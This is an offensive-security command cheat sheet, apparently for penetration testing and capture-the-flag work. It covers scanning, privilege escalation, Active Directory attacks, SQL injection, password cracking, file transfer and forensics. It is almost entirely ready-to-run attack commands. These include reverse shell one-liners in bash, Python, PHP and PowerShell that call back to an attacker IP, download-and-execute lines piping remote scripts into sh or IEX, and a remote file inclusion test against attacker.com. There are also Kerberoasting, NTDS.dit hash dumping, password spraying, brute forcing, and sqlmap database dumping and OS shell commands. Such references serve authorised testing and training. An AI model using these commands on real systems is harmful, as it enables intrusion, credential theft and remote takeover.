# Web Enumeration & Fuzzing

## Gobuster

### Basic Directory Scan
Scan with a common wordlist.
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt
```

### Thorough Directory Scan
Scan with a larger wordlist, more threads, and specific extensions.
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt -o gobuster_detailed.txt
```

### Subdomain Enumeration
Discover subdomains using a common wordlist.
```bash
gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster_subdomains.txt
```

### Virtual Host Discovery
Discover virtual hosts on the target.
```bash
gobuster vhost -u http://target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -o vhosts.txt
```

### Fuzzing Specific File Types
Fuzz for specific file extensions with verbose output.
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,bak,old,txt -v -o gobuster_files.txt
```

## Dirsearch

### Basic Scan
Perform a basic directory scan.
```bash
dirsearch -u http://target.com -o dirsearch_results.txt
```

### Extended Scan
Scan with multiple extensions and exclude specific status codes.
```bash
dirsearch -u http://target.com -e php,html,js,bak,txt,conf -x 403,404 -o dirsearch_extended.txt
```

### Recursive Scan
Perform a recursive scan with a custom wordlist.
```bash
dirsearch -u http://target.com -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -r -o dirsearch_recursive.txt
```

### Multiple Target Scan
Scan multiple targets listed in a file.
```bash
dirsearch -l targets.txt -e php,asp,aspx -o dirsearch_multiple.txt
```

### Scan with Cookie Authentication
Perform a scan using cookie-based authentication.
```bash
dirsearch -u http://target.com -e php -H "Cookie: PHPSESSID=r58tsfgpe45eokgmli81svu3h0" -o dirsearch_auth.txt
```

# Network Scanning with Nmap

### Quick Scan
Fast scan of common ports.
```bash
nmap -T4 -F 10.10.10.x
```

### Comprehensive Scan
Scan all ports, run default scripts, and detect service versions.
```bash
nmap -sC -sV -p- -oA full_scan 10.10.10.x
```

### Aggressive Scan
Enable OS detection, version detection, script scanning, and traceroute.
```bash
nmap -A -T4 10.10.10.x -oN aggressive_scan.txt
```

### UDP Scan
Scan top 1000 UDP ports.
```bash
nmap -sU -T4 10.10.10.x -oN udp_scan.txt
```

### Vulnerability Scanning
Run vulnerability detection scripts.
```bash
nmap --script vuln 10.10.10.x -oN vuln_scan.txt
```

### Web Server Enumeration
Enumerate web servers on common HTTP/S ports.
```bash
nmap --script http-enum 10.10.10.x -p 80,443 -oN web_enum.txt
```

### SMB Enumeration
Enumerate SMB shares and users.
```bash
nmap --script smb-enum-shares,smb-enum-users 10.10.10.x -p 445 -oN smb_enum.txt
```

### All Port Scan with Service Detection
Scan all 65535 TCP ports with service detection, ensuring a minimum packet rate.
```bash
nmap -p- -sV 10.10.10.x --min-rate 1000 -oN all_ports.txt
```

### Network Sweep
Discover live hosts on the network.
```bash
nmap -sn 10.10.10.0/24 -oN network_sweep.txt
```

# Linux Privilege Escalation

### SUID Binaries Search
Find files with SUID permission set.
```bash
find / -perm -u=s -type f 2>/dev/null
```

### World-Writable Files
Find world-writable files, excluding /proc and /sys.
```bash
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
```

### Sudo Permissions
List sudo permissions for the current user.
```bash
sudo -l
```

### Running Processes as Root
List processes running as root.
```bash
ps aux | grep "^root"
```

### Run LinPEAS Script
Download and execute LinPEAS for automated enumeration.
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Run LinEnum Script
Download and execute LinEnum for automated enumeration.
```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh
```

### Run unix-privesc-check
Download and run unix-privesc-check for detailed privilege escalation checks.
```bash
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check && chmod +x unix-privesc-check && ./unix-privesc-check detailed
```

# Windows Privilege Escalation

### Run PowerUp
Execute PowerUp script for Windows privilege escalation checks.
```powershell
powershell -exec bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
```

### Run WinPEAS
Execute WinPEAS script for Windows privilege escalation checks.
```powershell
powershell -exec bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1'); Invoke-WinPEAS"
```

### Check for Unquoted Service Paths
Identify services with unquoted paths that start automatically.
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\"\"\""
```

### Check AlwaysInstallElevated Registry Key
Check if AlwaysInstallElevated policy is enabled.
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Check for Weak File Permissions in Program Files
Find files in Program Files directories with "Everyone" full control.
```cmd
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
```

# Active Directory Enumeration

### User Enumeration with Kerbrute
Enumerate domain users using Kerbrute.
```bash
kerbrute userenum --dc dc.target.com -d target.com /usr/share/wordlists/SecLists/Usernames/Names/names.txt
```

### ASREPRoasting with Impacket
Exploit ASREPRoast vulnerability to get user hashes.
```bash
impacket-GetNPUsers target.com/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

### Kerberoasting with Impacket
Exploit Kerberoast vulnerability to get service account hashes.
```bash
impacket-GetUserSPNs target.com/username:password -outputfile kerberoast_hashes.txt
```

### BloodHound Data Collection
Collect data for BloodHound analysis.
```bash
bloodhound-python -d target.com -u username -p password -c All -ns 10.10.10.x
```

### LDAP Enumeration with ldapsearch
Enumerate LDAP for user objects.
```bash
ldapsearch -x -h 10.10.10.x -D "cn=binduser,cn=Users,dc=target,dc=com" -w password -b "dc=target,dc=com" "(objectClass=user)"
```

### Password Spraying with CrackMapExec
Attempt password spraying against SMB.
```bash
crackmapexec smb 10.10.10.x -u users.txt -p 'Password123' --continue-on-success
```

### Check Null Sessions
Check for SMB null sessions.
```bash
crackmapexec smb 10.10.10.x -u '' -p ''
```

### Extract NTDS.dit with Impacket
Dump domain controller hashes from NTDS.dit.
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

# SQL Injection

## SQLMap

### Basic Scan
Scan a URL for SQL injection vulnerabilities and list databases.
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

### Scan with Cookie Authentication
Scan a URL using cookie-based authentication.
```bash
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=j1nanfdo444jbah2gg3urv2u90" --dbs --batch
```

### Dump Specific Database
List tables from a specific database.
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables --batch
```

### Dump Specific Table
Dump data from a specific table.
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump --batch
```

### Test POST Parameters
Test POST parameters for SQL injection.
```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=admin" --dbs --batch
```

### Use Specific Technique
Force SQLMap to use a specific injection technique (e.g., Time-based blind).
```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=T --dbs --batch
```

### OS Shell
Attempt to get an OS shell via SQL injection.
```bash
sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
```

## Manual SQL Injection Tests (MySQL)

### Time-Based Blind
Test for time-based blind SQL injection.
```bash
curl -s "http://target.com/page.php?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -"
```

### Error-Based
Test for error-based SQL injection.
```bash
curl -s "http://target.com/page.php?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- -"
```

# Steganography & File Forensics

### Check File Metadata with Exiftool
Examine metadata of a file.
```bash
exiftool suspicious_image.jpg
```

### Check for Hidden Data with Binwalk
Scan a file for embedded files and executable code.
```bash
binwalk suspicious_image.jpg
```

### Extract Hidden Data with Binwalk
Extract embedded files from a file.
```bash
binwalk -e suspicious_image.jpg
```

### Check for Steganography with Steghide (No Password)
Attempt to extract data using Steghide without a password.
```bash
steghide extract -sf suspicious_image.jpg
```

### Extract with Steghide and Password
Attempt to extract data using Steghide with a password.
```bash
steghide extract -sf suspicious_image.jpg -p password
```

### Check for Least Significant Bit (LSB) Steganography
Analyze image files for LSB steganography.
```bash
zsteg suspicious_image.png
```

### Check with Stegoveritas (All-in-One)
Use Stegoveritas for comprehensive steganography analysis.
```bash
stegoveritas suspicious_image.jpg
```

### Check Audio Files with Sonic Visualiser
Analyze audio files for hidden data (manual tool).
```
sonic-visualiser suspicious_audio.wav
```

### Use Foremost to Extract Embedded Files
Recover files based on their headers, footers, and internal data structures.
```bash
foremost suspicious_image.jpg -o extracted_files
```

### Use Strings to Find Embedded Text
Extract printable strings from a file, useful for finding flags or clues.
```bash
strings suspicious_image.jpg | grep -i "flag"
```

# Web Application Testing (Manual Checks)

### Basic XSS Test
Test for Cross-Site Scripting by injecting a simple script.
```bash
curl -s "http://target.com/page.php?param=<script>alert(1)</script>"
```

### Directory Traversal Test
Test for Directory Traversal to access sensitive files.
```bash
curl -s "http://target.com/page.php?file=../../../etc/passwd"
```

### LFI Check for PHP Wrappers
Test for Local File Inclusion using PHP filter wrappers.
```bash
curl -s "http://target.com/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd"
```

### RFI Test
Test for Remote File Inclusion by including a remote file.
```bash
curl -s "http://target.com/page.php?file=http://attacker.com/shell.txt"
```

### Command Injection Test
Test for OS Command Injection by appending system commands.
```bash
curl -s "http://target.com/page.php?cmd=id;ls"
```

### Test File Upload Bypass with Curl
Attempt to bypass file upload restrictions by manipulating filename/content-type.
```bash
curl -s -F "file=@shell.php;filename=shell.jpg" http://target.com/upload.php
```

### JWT Token Test with jwt-tool
Analyze and test JSON Web Tokens.
```bash
python3 jwt_tool.py [token] -T
```

### SSRF Basic Test
Test for Server-Side Request Forgery by making the server request an internal resource.
```bash
curl -s "http://target.com/page.php?url=http://localhost:22"
```

### Nikto Full Scan
Perform a comprehensive web server scan with Nikto.
```bash
nikto -h http://target.com -o nikto_results.txt
```

# Password Cracking

## Hydra

### SSH Brute Force
Brute-force SSH login credentials.
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.x -t 4
```

### Web Form Brute Force
Brute-force web login form credentials.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.x http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

## Hashcat

### MD5 Hash
Crack MD5 hashes.
```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### SHA256 Hash
Crack SHA256 hashes.
```bash
hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### NTLM Hash
Crack NTLM hashes.
```bash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### bcrypt Hash
Crack bcrypt hashes.
```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

## John the Ripper

### Crack Hashes with Wordlist
Crack various hash types using a wordlist.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Zip File Cracking

### fcrackzip
Crack password-protected ZIP files.
```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt protected.zip
```

# Reverse Shells & Listeners

### Start Netcat Listener
Listen for incoming connections on a specific port.
```bash
nc -lvnp 4444
```

### Bash Reverse Shell One-Liner
Establish a reverse shell using Bash.
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.x/4444 0>&1'
```

### Python Reverse Shell One-Liner
Establish a reverse shell using Python.
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP Reverse Shell One-Liner
Establish a reverse shell using PHP.
```php
php -r '$sock=fsockopen("10.10.10.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell Reverse Shell One-Liner
Establish a reverse shell using PowerShell.
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$client = New-Object System.Net.Sockets.TCPClient('10.10.10.x',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
```

### Start Multi-Handler with Metasploit
Set up a Metasploit listener for various payloads.
```bash
msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.x; set LPORT 4444; exploit"
```

# File Transfer

### Python Simple HTTP Server
Start a simple HTTP server to serve files from the current directory.
```bash
python3 -m http.server 8000
```

### Upload File with Curl
Upload a file to a web server using curl.
```bash
curl -F "file=@/path/to/file.txt" http://target.com/upload.php
```

### Download File with Wget
Download a file from a web server.
```bash
wget http://10.10.10.x:8000/file.txt
```

### Transfer with Netcat (Receiver)
Receive a file using netcat.
```bash
nc -lvnp 4444 > file.txt
```

### Transfer with Netcat (Sender)
Send a file using netcat.
```bash
nc 10.10.10.x 4444 < file.txt
```

### Base64 Encode/Decode Transfer
Transfer files by encoding to Base64 and decoding on the target.
```bash
# On source:
cat file.txt | base64 -w 0; echo
# On target:
echo "base64string" | base64 -d > file.txt
```

### SCP Transfer
Securely copy files using SCP.
```bash
scp file.txt user@10.10.10.x:/path/to/destination/
```

### SMB Server with Impacket
Start an SMB server to share files.
```bash
impacket-smbserver share $(pwd) -smb2support
```

### Access SMB Share from Windows
Copy a file from an SMB share on Windows.
```cmd
copy \\10.10.10.x\share\file.txt C:\file.txt
```

# Memory & Binary Analysis

## Memory Forensics

### Create Memory Dump with LiME (Linux)
Load LiME kernel module to dump RAM.
```bash
insmod lime-$(uname -r).ko "path=/tmp/ram.lime format=lime"
```

### Analyze Memory Dump with Volatility
Use Volatility to analyze memory dumps.
```bash
# Get image information
volatility -f memory.dmp imageinfo

# List processes (example profile)
volatility -f memory.dmp --profile=Win10x64_19041 pslist

# Scan for files containing "flag" (example profile)
volatility -f memory.dmp --profile=Win10x64_19041 filescan | grep -i "flag"
```

## Binary Analysis

### Extract Strings from Binary
Extract printable strings from a binary file.
```bash
strings suspicious_binary | grep -i "flag"
```

### Check File Type
Determine the type of a file.
```bash
file suspicious_file
```

### Run Basic Static Analysis with FLOSS
Use FLOSS (FireEye Labs Obfuscated String Solver) to extract obfuscated strings.
```bash
floss suspicious_file
```

### Extract Embedded Files with Foremost
Recover embedded files from a binary or image.
```bash
foremost suspicious_file -o extracted_files
```

### Quick Scan with ClamAV
Scan a directory for known malware.
```bash
clamscan -r /path/to/directory
```

